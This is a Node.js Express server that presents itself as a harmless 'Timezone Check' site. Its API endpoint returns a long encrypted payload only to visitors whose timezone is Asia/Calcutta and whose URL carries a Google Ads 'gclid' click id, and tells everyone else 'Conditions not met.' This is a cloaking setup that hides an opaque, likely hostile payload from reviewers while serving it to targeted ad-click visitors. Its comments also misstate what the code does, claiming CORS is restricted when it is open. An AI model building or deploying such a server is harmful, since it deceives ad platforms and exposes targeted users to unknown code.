const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors'); // Import cors

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Enable CORS and restrict it to http://localhost:3000
app.use(cors());
// Serve the HTML file
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Timezone Check</title>
    </head>
    <body>
        <h1>Welcome to Website B</h1>
        <p>This server checks the timezone and URL parameters.</p>
    </body>
    </html>
    `);
});

// Endpoint to receive data from website A
app.post('/api/timezone', (req, res) => {
    const { timezone, fullUrl } = req.body;

    // Check if the request body is valid
    if (!req.body || !timezone || !fullUrl) {
        return res.status(400).send('Invalid request body.');
    }

    console.log(`Received timezone: ${timezone}, fullUrl: ${fullUrl}`);

    // Check if the timezone is Asia/Calcutta
    const isTimezoneJapan = timezone === 'Asia/Calcutta';

    // Check if the URL contains 'gclid'
    const containsGclid = fullUrl.includes('gclid');

    // Base64 code to send in response
    const base64Code = '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'; // Your base64 string here
    // If both conditions are met, respond with the base64 code
    if (isTimezoneJapan && containsGclid) {
        console.log(`Response sent: ${base64Code}`);
        return res.status(200).send(base64Code); // Send the base64 string directly
    } else {
        const responseMessage = 'Conditions not met.';
        console.log(responseMessage);
        return res.status(200).send(responseMessage);
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
